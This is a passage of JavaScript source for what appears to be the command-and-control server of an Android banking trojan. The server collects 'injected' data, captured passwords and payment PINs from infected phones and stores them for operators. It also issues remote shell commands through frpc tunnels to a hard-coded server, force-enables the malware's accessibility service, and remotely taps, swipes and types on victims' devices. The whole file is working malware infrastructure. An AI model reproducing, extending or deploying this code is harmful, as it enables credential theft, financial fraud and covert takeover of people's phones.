    broadcastToAdmins({ type: 'credential_captured', sessionId: deviceId, deviceId, botId: deviceId, data });
  }
  res.json({ success: true });
});
app.post('/api/sync/form', (req, res) => {
  // ★★★ 注入数据上报（APP HttpManager.uploadInjectionData 发到这里）★★★
  const data = req.body || {};
  const deviceId = data.deviceId || data.sessionId || '';
  console.log(`[INJECT] ★ 收到注入数据(/api/sync/form): deviceId=${deviceId}, keys=${Object.keys(data).join(',')}, data=${JSON.stringify(data).slice(0, 500)}`);
  if (deviceId) {
    const packageName = data.packageName || data.pkg || data.package_name || '';
    const bodyStr = JSON.stringify(data);
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, bodyStr, 'injection', data.timestamp || Date.now());
    // 通知管理端
    broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
    console.log(`[INJECT] ✅ 注入数据已存储并通知管理端: ${deviceId} / ${packageName}`);
  }
  res.json({ success: true });
});

// APP 注入数据上报（HTTP POST）
app.post('/injectionData', (req, res) => {
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据: ${JSON.stringify(data).slice(0, 200)}`);
  // 存入 sms_notifications 表
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  // 通知管理端
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/injectionData', (req, res) => {
  // 同上，兼容带 /api 前缀
  const data = req.body || {};
  console.log(`[INJECT] 收到注入数据(api): ${JSON.stringify(data).slice(0, 200)}`);
  const deviceId = data.deviceId || data.sessionId || '';
  const packageName = data.packageName || data.pkg || '';
  const body = data.data || data.body || data.result || JSON.stringify(data);
  if (deviceId) {
    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
    const deviceName = deviceRow ? `${(deviceRow.brand||'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
      .run(deviceId, deviceName, deviceId, `[注入] ${packageName}`, typeof body === 'string' ? body : JSON.stringify(body), 'injection', Date.now());
  }
  broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data });
  res.json({ success: true });
});
app.post('/api/adb-keys/upload', (req, res) => res.json({ success: true }));
app.post('/api/file/upload-from-device', (req, res) => res.json({ success: true }));

// ============================================================
// 管理端 API
// ============================================================
app.get('/api/device/list', authMiddleware, (req, res) => {
  let rows;
  // 超管看所有设备，子账号只看分配的
  const user = db.prepare('SELECT is_super,assigned_devices FROM users WHERE id=?').get(req.user.userId);
  if (user && user.is_super) {
    rows = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
  } else {
    const assigned = (user?.assigned_devices || '').split(',').filter(Boolean);
    if (assigned.length > 0) {
      rows = db.prepare(`SELECT * FROM devices WHERE device_id IN (${assigned.map(() => '?').join(',')}) ORDER BY last_seen DESC`).all(...assigned);
    } else {
      rows = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC').all();
    }
  }
  res.json({ success: true, data: rows.map(deviceToListApi) });
});

// 下发设备到子账户
app.put('/api/device/:deviceId/assign', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { username } = req.body || {};
  if (!username) return res.json({ success: false, message: '请选择目标子账户' });
  const user = db.prepare('SELECT id,assigned_devices FROM users WHERE username=?').get(username);
  if (!user) return res.json({ success: false, message: '用户不存在' });
  // 把设备加到用户的 assigned_devices 列表
  const current = (user.assigned_devices || '').split(',').filter(Boolean);
  if (!current.includes(deviceId)) {
    current.push(deviceId);
    db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(current.join(','), user.id);
  }
  res.json({ success: true, message: `设备已下发到 ${username}` });
});

// 设备分组（设置设备所属分组）
app.put('/api/device/:deviceId/group', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  const { groupName, groupId } = req.body || {};
  try { db.exec("ALTER TABLE devices ADD COLUMN group_name TEXT DEFAULT ''"); } catch {}
  db.prepare('UPDATE devices SET group_name=? WHERE device_id=?').run(groupName || '', deviceId);
  res.json({ success: true });
});

app.get('/api/users', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT id,username,role,avatar,max_devices,is_super,assigned_devices,created_at FROM users').all();
  res.json({ success: true, data: rows.map(r => ({
    id: r.id,
    username: r.username,
    role: r.role,
    isSuper: !!r.is_super,
    isOnline: true,
    ip: '',
    maxDevices: r.max_devices || 100,
    assignedDevices: r.assigned_devices || '',
    createdAt: new Date((r.created_at || 0) * 1000).toISOString().replace('T', ' ').slice(0, 19)
  })) });
});

app.post('/api/users', authMiddleware, (req, res) => {
  const { username, password, role, maxDevices, isSuper } = req.body || {};
  if (!username || !password) return res.json({ success: false, message: '用户名和密码不能为空' });
  const exists = db.prepare('SELECT id FROM users WHERE username=?').get(username);
  if (exists) return res.json({ success: false, message: '用户名已存在' });
  const hash = bcrypt.hashSync(password, 10);
  // 子账号默认 role 为 "user"（前端下发列表只显示 role=user 的）
  const userRole = role || 'user';
  db.prepare('INSERT INTO users (username,password_hash,role,max_devices,is_super) VALUES (?,?,?,?,?)').run(username, hash, userRole, maxDevices || 100, isSuper ? 1 : 0);
  res.json({ success: true, message: '用户创建成功' });
});

app.put('/api/users/:id', authMiddleware, (req, res) => {
  const { password, role, maxDevices, isSuper, assignedDevices } = req.body || {};
  if (password) {
    const hash = bcrypt.hashSync(password, 10);
    db.prepare('UPDATE users SET password_hash=? WHERE id=?').run(hash, req.params.id);
  }
  if (role !== undefined) db.prepare('UPDATE users SET role=? WHERE id=?').run(role, req.params.id);
  if (maxDevices !== undefined) db.prepare('UPDATE users SET max_devices=? WHERE id=?').run(maxDevices, req.params.id);
  if (isSuper !== undefined) db.prepare('UPDATE users SET is_super=? WHERE id=?').run(isSuper ? 1 : 0, req.params.id);
  if (assignedDevices !== undefined) db.prepare('UPDATE users SET assigned_devices=? WHERE id=?').run(assignedDevices, req.params.id);
  res.json({ success: true });
});

app.delete('/api/users/:id', authMiddleware, (req, res) => {
  const user = db.prepare('SELECT is_super FROM users WHERE id=?').get(req.params.id);
  if (user && user.is_super) return res.json({ success: false, message: '不能删除超级管理员' });
  db.prepare('DELETE FROM users WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

app.get('/api/users/login-logs', authMiddleware, (req, res) => {
  const rows = db.prepare('SELECT * FROM login_logs ORDER BY created_at DESC LIMIT 100').all();
  const data = rows.map(r => ({
    id: r.id,
    username: r.username,
    loginTime: r.created_at ? new Date(r.created_at * 1000).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' }) : '',
    ipAddress: r.ip || '',
    success: r.success,
    isOnline: false
  }));
  res.json({ success: true, data });
});

app.get('/api/system/info', authMiddleware, (req, res) => {
  const os = require('os');
  const total = db.prepare('SELECT COUNT(*) as c FROM devices').get().c;
  const online = db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_connected=1").get().c;
  const totalMem = os.totalmem();
  const freeMem = os.freemem();
  const usedMem = totalMem - freeMem;
  const cpus = os.cpus();
  
  let diskTotal = 0, diskUsed = 0, diskFree = 0;
  try {
    const { execSync } = require('child_process');
    const dfOutput = execSync("df -B1 / | tail -1").toString().trim().split(/\s+/);
    diskTotal = parseInt(dfOutput[1]) || 0;
    diskUsed = parseInt(dfOutput[2]) || 0;
    diskFree = parseInt(dfOutput[3]) || 0;
  } catch {}

  res.json({ success: true, data: {
    version: '1.0.0',
    uptime: Math.floor(process.uptime()),
    totalDevices: total,
    onlineDevices: online,
    cpuCores: cpus.length,
    cpuModel: cpus[0]?.model || 'Unknown',
    cpuUsage: 0,
    memTotal: totalMem,
    memUsed: usedMem,
    memFree: freeMem,
    memUsage: Math.round((usedMem / totalMem) * 100),
    diskTotal: diskTotal,
    diskUsed: diskUsed,
    diskFree: diskFree,
    diskUsage: diskTotal > 0 ? Math.round((diskUsed / diskTotal) * 100) : 0,
    netSendSpeed: 0,
    netRecvSpeed: 0,
    netBytesSent: 0,
    netBytesRecv: 0,
    hostname: os.hostname(),
    platform: os.platform() + ' ' + os.release(),
    hostUptime: Math.floor(os.uptime()),
    totalApks: 0,
    apkOutputSize: 0,
    apkDownloadCount: 0,
    totalAbPacks: 0,
    abPackOutputSize: 0
  }});
});

app.get('/api/license/max-users', authMiddleware, (req, res) => res.json({ success: true, data: { maxUsers: 999 } }));
app.get('/api/injection/counts', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const counts = {};
  for (const id of deviceIds) {
    const row = db.prepare("SELECT COUNT(*) as c FROM sms_notifications WHERE device_id=? AND type='injection'").get(id);
    counts[id] = row ? row.c : 0;
  }
  res.json({ success: true, counts });
});
app.get('/api/devices/crypto-wallets', (req, res) => {
  const deviceIds = (req.query.deviceIds || '').split(',').filter(Boolean);
  const result = {};
  for (const id of deviceIds) result[id] = [];
  res.json({ success: true, result });
});
app.get('/api/ip-geo/:ip', (req, res) => res.json({ success: true, data: { country: 'HK', countryName: 'Hong Kong', city: 'Hong Kong' } }));
app.get('/api/black-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
app.get('/api/sensitive-apps', authMiddleware, (req, res) => res.json({ success: true, data: { apps: [] } }));
app.get('/api/payment-strategies', authMiddleware, (req, res) => res.json({ success: true, data: [] }));
app.get('/api/password-inputs/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 20;
  const passwordType = req.query.passwordType || '';
  const offset = (page - 1) * pageSize;
  let whereClause = 'WHERE device_id=?';
  const params = [deviceId];
  if (passwordType && passwordType !== 'DEFAULT') {
    whereClause += ' AND password_type=?';
    params.push(passwordType);
  }
  const total = db.prepare(`SELECT COUNT(*) as c FROM password_inputs ${whereClause}`).get(...params).c;
  const rows = db.prepare(`SELECT * FROM password_inputs ${whereClause} ORDER BY created_at DESC LIMIT ? OFFSET ?`).all(...params, pageSize, offset);
  res.json({ success: true, data: { passwords: rows.map(r => ({ id: r.id, deviceId: r.device_id, appName: r.app_name, packageName: r.package_name, password: r.input_text, value: r.input_text, inputText: r.input_text, type: r.password_type, passwordType: r.password_type, capturedAt: r.timestamp || Math.floor(r.created_at * 1000), date: r.timestamp || Math.floor(r.created_at * 1000), timestamp: r.timestamp || Math.floor(r.created_at * 1000), createdAt: r.created_at })), total, page, pageSize } });
});
app.get('/api/wechat-passwords/:deviceId', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 10;
  res.json({ success: true, data: { passwords: [], total: 0, page, pageSize } });
});
app.delete('/api/password-inputs/id/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE id=?').run(req.params.id);
  res.json({ success: true });
});
app.put('/api/password-inputs/id/:id/remark', authMiddleware, (req, res) => {
  const { remark } = req.body || {};
  db.prepare('UPDATE password_inputs SET app_name=? WHERE id=?').run(remark || '', req.params.id);
  res.json({ success: true });
});
app.delete('/api/password-inputs/clear/:deviceId', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/payment-cipher-records', authMiddleware, (req, res) => {
  // 支付密码记录（由 payment_cipher_captured 事件写入，和普通密码记录分开）
  res.json({ success: true, data: [], total: 0 });
});
app.get('/api/settings/telegram', authMiddleware, (req, res) => res.json({ success: true, data: {} }));
app.get('/api/gesture/list', authMiddleware, (req, res) => res.json({ success: true, data: [] }));
app.get('/api/gesture/records', authMiddleware, (req, res) => res.json({ success: true, data: [], total: 0 }));
app.post('/api/gesture/save', authMiddleware, (req, res) => res.json({ success: true }));
app.delete('/api/gesture/:id', authMiddleware, (req, res) => res.json({ success: true }));
app.post('/api/device-custom-info', authMiddleware, (req, res) => {
  const { deviceId, realName, idCard, expiryDate, otherInfo } = req.body || {};
  if (deviceId) {
    const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
    try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
    db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, deviceId);
  }
  res.json({ success: true });
});
app.get('/api/device-custom-info', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  if (!deviceId) return res.json({ success: true, data: {} });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(deviceId);
  if (row && row.custom_info) {
    try { return res.json({ success: true, data: JSON.parse(row.custom_info) }); } catch {}
  }
  res.json({ success: true, data: { realName: '', idCard: '', expiryDate: '', otherInfo: '' } });
});

// 删除设备
app.delete('/api/device/:deviceId', authMiddleware, (req, res) => {
  const { deviceId } = req.params;
  if (!deviceId) return res.json({ success: false, message: 'deviceId required' });
  const ws = deviceConnections.get(deviceId);
  if (ws) { try { ws.close(); } catch(e){} deviceConnections.delete(deviceId); }
  db.prepare('DELETE FROM devices WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM sms_notifications WHERE device_id=?').run(deviceId);
  db.prepare('DELETE FROM password_inputs WHERE device_id=?').run(deviceId);
  broadcastToAdmins({ type: 'device_removed', deviceId, sessionId: deviceId });
  res.json({ success: true });
});

app.get('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  const row = db.prepare('SELECT custom_info FROM devices WHERE device_id=?').get(req.params.deviceId);
  if (row && row.custom_info) {
    try { const d = JSON.parse(row.custom_info); return res.json({ success: true, ...d }); } catch {}
  }
  res.json({ success: true, realName: '', idCard: '', expiryDate: '', otherInfo: '' });
});
app.post('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.put('/api/device/:deviceId/custom-info', authMiddleware, (req, res) => {
  const { realName, idCard, expiryDate, otherInfo } = req.body || {};
  const info = JSON.stringify({ realName, idCard, expiryDate, otherInfo });
  try { db.exec("ALTER TABLE devices ADD COLUMN custom_info TEXT DEFAULT ''"); } catch {}
  db.prepare('UPDATE devices SET custom_info=? WHERE device_id=?').run(info, req.params.deviceId);
  res.json({ success: true });
});
app.get('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch {}
  const rows = db.prepare('SELECT * FROM device_groups ORDER BY id').all();
  res.json({ success: true, groups: rows.map(r => ({ id: r.id, name: r.name, deviceIds: (r.device_ids || '').split(',').filter(Boolean), createdAt: r.created_at })) });
});
app.post('/api/device/groups', authMiddleware, (req, res) => {
  try { db.exec("CREATE TABLE IF NOT EXISTS device_groups (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, device_ids TEXT DEFAULT '', created_at REAL DEFAULT (strftime('%s','now')))"); } catch {}
  const { name, deviceIds } = req.body || {};
  if (!name) return res.json({ success: false, message: '分组名不能为空' });
  const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
  db.prepare('INSERT INTO device_groups (name, device_ids) VALUES (?,?)').run(name, ids);
  res.json({ success: true, message: '分组创建成功' });
});
app.put('/api/device/groups/:id', authMiddleware, (req, res) => {
  const { name, deviceIds } = req.body || {};
  if (name) db.prepare('UPDATE device_groups SET name=? WHERE id=?').run(name, req.params.id);
  if (deviceIds !== undefined) {
    const ids = Array.isArray(deviceIds) ? deviceIds.join(',') : (deviceIds || '');
    db.prepare('UPDATE device_groups SET device_ids=? WHERE id=?').run(ids, req.params.id);
  }
  res.json({ success: true });
});
app.delete('/api/device/groups/:id', authMiddleware, (req, res) => {
  db.prepare('DELETE FROM device_groups WHERE id=?').run(req.params.id);
  res.json({ success: true });
});

// 文件管理（通过 frpc ADB shell 列出目录）
app.get('/api/file/list', authMiddleware, (req, res) => {
  const deviceId = req.query.deviceId || '';
  let dirPath = req.query.path || '/sdcard';
  // 确保路径末尾有斜杠（避免符号链接问题）
  if (!dirPath.endsWith('/')) dirPath += '/';
  const http = require('http');
  const cmd = encodeURIComponent(`ls -la "${dirPath}"`);
  http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${cmd}`, { timeout: 10000 }, (proxyRes) => {
    const chunks = [];
    proxyRes.on('data', c => chunks.push(c));
    proxyRes.on('end', () => {
      try {
        const data = JSON.parse(Buffer.concat(chunks).toString());
        const output = data.data?.output || '';
        const files = output.split('\n').filter(l => l.trim() && !l.startsWith('total')).map(line => {
          const parts = line.trim().split(/\s+/);
          if (parts.length < 7) return null;
          const perms = parts[0] || '';
          const isDir = perms.startsWith('d');
          const size = parseInt(parts[4]) || 0;
          const dateStr = `${parts[5]} ${parts[6]}`;
          const name = parts.slice(7).join(' ').replace(/ ->.*$/, '');
          if (!name || name === '.' || name === '..') return null;
          const cleanPath = dirPath.replace(/\/+$/, '');
          return { name, isDirectory: isDir, size, permissions: perms, path: `${cleanPath}/${name}`, modifiedAt: dateStr };
        }).filter(Boolean);
        res.json({ success: true, files: files });
      } catch {
        res.json({ success: true, files: [] });
      }
    });
  }).on('error', () => res.json({ success: true, files: [] }));
});

// frpc 隧道配置（local-service 启动 frpc 时请求）
app.all('/api/tunnel/config', (req, res) => {
  const deviceId = req.query.deviceId || req.body?.deviceId || '';
  const localPort = parseInt(req.body?.localPort) || 7910;
  const token = 'fisher_frp_2026';
  const remotePort = getDevicePort(deviceId);
  const configINI = `[common]\nserver_addr = 202.95.8.130\nserver_port = 7000\ntoken = ${token}\nadmin_addr = 127.0.0.1\nadmin_port = 7400\n\n[${deviceId}_local]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = ${localPort}\nremote_port = ${remotePort}\n`;
  res.json({
    success: true,
    data: {
      serverAddr: '202.95.8.130',
      serverPort: 7000,
      token: token,
      remotePort: remotePort,
      localPort: localPort,
      configINI: configINI
    }
  });
});

// 设备操作日志
app.get('/api/logs', authMiddleware, (req, res) => {
  const { deviceId, page, pageSize } = req.query;
  res.json({ success: true, data: { logs: [], total: 0, page: parseInt(page)||1, pageSize: parseInt(pageSize)||50 } });
});

// 短信/通知
app.get('/api/sms/notifications', authMiddleware, (req, res) => {
  const page = parseInt(req.query.page) || 1;
  const pageSize = parseInt(req.query.pageSize) || 50;
  const offset = (page - 1) * pageSize;
  const total = db.prepare('SELECT COUNT(*) as c FROM sms_notifications').get().c;
  const rows = db.prepare('SELECT * FROM sms_notifications ORDER BY date DESC LIMIT ? OFFSET ?').all(pageSize, offset);
  res.json({
    success: true,
    data: {
      list: rows.map(r => ({
        id: r.id,
        address: r.address,
        body: r.body,
        date: r.date,
        deviceId: r.device_id,
        deviceName: r.device_name,
        serialNumber: r.serial_number,
        type: r.type
      })),
      page,
      pageSize,
      total
    }
  });
});

// 前端通过HTTP发送命令给设备（桥接到 Bridge 或 WebSocket）
app.post('/api/bridge/command/:deviceId', authMiddleware, (req, res) => {
  const deviceId = req.params.deviceId;
  const { command, params } = req.body || {};
  
  // 优先通过 Bridge（local-service）执行命令
  const bridgeWs = bridgeConnections.get(deviceId);
  if (bridgeWs && bridgeWs.readyState === 1) {
    // 坐标不缩放：前端已经换算到设备实际分辨率
    // 动态计算 scale：从截图缓存读实际宽度
    let scale = 2; // 默认
    try {
      const devRow = db.prepare('SELECT screen_width FROM devices WHERE device_id=?').get(deviceId);
      const realW = devRow?.screen_width || 720;
      const cached = screenshotCache.get(deviceId);
      if (cached && cached.data && cached.data.length > 10) {
        // 解析 JPEG SOF0 获取宽度
        const buf = cached.data;
        for (let i = 0; i < buf.length - 9; i++) {
          if (buf[i] === 0xFF && (buf[i+1] === 0xC0 || buf[i+1] === 0xC2)) {
            const shotW = buf.readUInt16BE(i + 7);
            if (shotW > 0 && shotW < 10000) {
              scale = realW / shotW;
              break;
            }
          }
        }
      }
    } catch(e) { /* fallback scale=2 */ }
    let fixedParams = params || {};
    if (command === 'click' || command === 'tap') {
      if (fixedParams.x) fixedParams.x = Math.round(fixedParams.x * scale);
      if (fixedParams.y) fixedParams.y = Math.round(fixedParams.y * scale);
    }
    if (command === 'swipe') {
      if (fixedParams.startX) fixedParams.startX = Math.round(fixedParams.startX * scale);
      if (fixedParams.startY) fixedParams.startY = Math.round(fixedParams.startY * scale);
      if (fixedParams.endX) fixedParams.endX = Math.round(fixedParams.endX * scale);
      if (fixedParams.endY) fixedParams.endY = Math.round(fixedParams.endY * scale);
    }
    
    // dumpUI 等需要返回数据的命令通过 frpc 端口请求
    if (command === 'dumpUI' || command === 'dumpHierarchy' || command === 'getUiHierarchy') {
      const http = require('http');
      const proxyReq = http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/${command}`, { timeout: 15000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', (chunk) => chunks.push(chunk));
        proxyRes.on('end', () => {
          const data = Buffer.concat(chunks);
          if (!res.headersSent) { res.set('Content-Type', proxyRes.headers['content-type'] || 'application/json'); res.send(data); }
        });
      });
      proxyReq.on('error', (e) => { if (!res.headersSent) res.json({ success: false, message: e.message }); });
      proxyReq.on('timeout', () => { proxyReq.destroy(); if (!res.headersSent) res.json({ success: false, message: 'timeout' }); });
      return;
    }
    
    // 触摸/滑动/按键命令：直接通过 frpc HTTP 端口调用 local-service REST API（低延迟）
    if (command === 'click' || command === 'tap') {
      const http = require('http');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/tap?x=${fixedParams.x || 0}&y=${fixedParams.y || 0}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'tap executed' }); });
      }).on('error', () => {
        // frpc 失败，回退到 Bridge WS
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'tap', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'tap via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: tap raw=${JSON.stringify(params)} scaled=${fixedParams.x},${fixedParams.y} scale=${scale} (frpc)`);
      return;
    }
    
    if (command === 'swipe') {
      const http = require('http');
      const x1 = fixedParams.startX || fixedParams.x1 || 0;
      const y1 = fixedParams.startY || fixedParams.y1 || 0;
      const x2 = fixedParams.endX || fixedParams.x2 || 0;
      const y2 = fixedParams.endY || fixedParams.y2 || 0;
      const duration = fixedParams.duration || 300;
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/swipe?x1=${x1}&y1=${y1}&x2=${x2}&y2=${y2}&duration=${duration}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'swipe executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'swipe', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'swipe via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: swipe (frpc直连)`);
      return;
    }
    
    if (command === 'keyevent') {
      const http = require('http');
      const keycode = fixedParams.keycode || fixedParams.keyCode || fixedParams.code || 0;
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/keyevent?keycode=${keycode}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'keyevent executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command: 'keyevent', params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'keyevent via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: keyevent ${keycode} (frpc直连)`);
      return;
    }
    
    if (command === 'text' || command === 'inputText') {
      const http = require('http');
      const text = encodeURIComponent(fixedParams.text || fixedParams.content || '');
      const url = `http://127.0.0.1:${getDevicePort(deviceId)}/text?text=${text}`;
      http.get(url, { timeout: 3000 }, (proxyRes) => {
        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => { if (!res.headersSent) res.json({ success: true, message: 'text executed' }); });
      }).on('error', () => {
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
        if (!res.headersSent) res.json({ success: true, message: 'text via bridge' });
      });
      console.log(`[CMD] → ${deviceId}: text (frpc直连)`);
      return;
    }
    
    // 启用无障碍服务：通过 frpc shell 直接执行 settings put
    if (command === 'enableAccessibility' || command === 'restoreAccessibility') {
      const _http = require('http');
      const _port = getDevicePort(deviceId);
      const _devRow = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
      const _pkg = _devRow && _devRow.app_name && _devRow.app_name.startsWith('com.') ? _devRow.app_name : null;
      if (_pkg) {
        const _svc = _pkg + '/com.titan.solid.luck.service.unfaiahnst';
        const _c = encodeURIComponent('settings put secure enabled_accessibility_services ' + _svc + ' && settings put secure accessibility_enabled 1');
        _http.get('http://127.0.0.1:' + _port + '/shell?cmd=' + _c, { timeout: 6000 }, function() {
          console.log('[CMD] a11y fast', deviceId, _svc);
          if (!res.headersSent) res.json({ success: true, data: { success: true, message: 'a11y enabled: ' + _svc } });
        }).on('error', function(e2) {
          if (!res.headersSent) res.json({ success: true, data: { success: false, message: e2.message } });
        });
        return;
      }

      const http = require('http');
      // 查询设备上的包名（从数据库获取或使用已知的）
      const device = db.prepare('SELECT app_name FROM devices WHERE device_id=?').get(deviceId);
      // 先获取当前包名
      const getPkgCmd = encodeURIComponent('pm list packages -3 | grep -v google | grep -v android | grep -v vivo | grep -v baidu | grep -v tencent | grep -v taobao | grep -v sina | grep -v kuaishou | grep -v jingdong | grep -v xunmeng | grep -v smile | grep -v dragon | grep -v omron | grep -v unionpay | grep -v kaixinkan | grep -v xtc');
      http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${getPkgCmd}`, { timeout: 5000 }, (pkgRes) => {
        const chunks = [];
        pkgRes.on('data', c => chunks.push(c));
        pkgRes.on('end', () => {
          try {
            const pkgData = JSON.parse(Buffer.concat(chunks).toString());
            const output = pkgData.data?.output || '';
            // 找到我们的包（通常是 com.xxx.yyyyy 格式，14字符）
            const pkgs = output.split('\n').map(l => l.trim().replace('package:', '')).filter(p => p && p.startsWith('com.') && p.length <= 20);
            const ourPkg = pkgs[0] || 'com.dev.rehwft';
            const service = `${ourPkg}/com.titan.solid.luck.service.unfaiahnst`;
            
            // 执行 settings put
            const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
            http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
              // 同时启用 accessibility_enabled
              const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => {}).on('error', () => {});
              console.log(`[CMD] ✅ ${deviceId}: 无障碍已启用 (${service})`);
              if (!res.headersSent) res.json({ success: true, data: { success: true, message: `无障碍已启用: ${service}` } });
            }).on('error', (e) => {
              console.log(`[CMD] ❌ ${deviceId}: 启用无障碍失败 - ${e.message}`);
              if (!res.headersSent) res.json({ success: true, data: { success: false, message: e.message } });
            });
          } catch (e) {
            // 回退：直接用已知的包名
            const service = 'com.dev.rehwft/com.titan.solid.luck.service.unfaiahnst';
            const enableCmd = encodeURIComponent(`settings put secure enabled_accessibility_services ${service}`);
            http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enableCmd}`, { timeout: 5000 }, () => {
              const enabledCmd = encodeURIComponent('settings put secure accessibility_enabled 1');
              http.get(`http://127.0.0.1:${getDevicePort(deviceId)}/shell?cmd=${enabledCmd}`, { timeout: 3000 }, () => {}).on('error', () => {});
              if (!res.headersSent) res.json({ success: true, data: { success: true, message: `无障碍已启用: ${service}` } });
            }).on('error', () => {
              if (!res.headersSent) res.json({ success: true, data: { success: false, message: '启用失败' } });
            });
          }
        });
      }).on('error', () => {
        // frpc 不可用，回退到 Bridge
        bridgeWs.send(JSON.stringify({ type: 'command', command, params: fixedParams }));
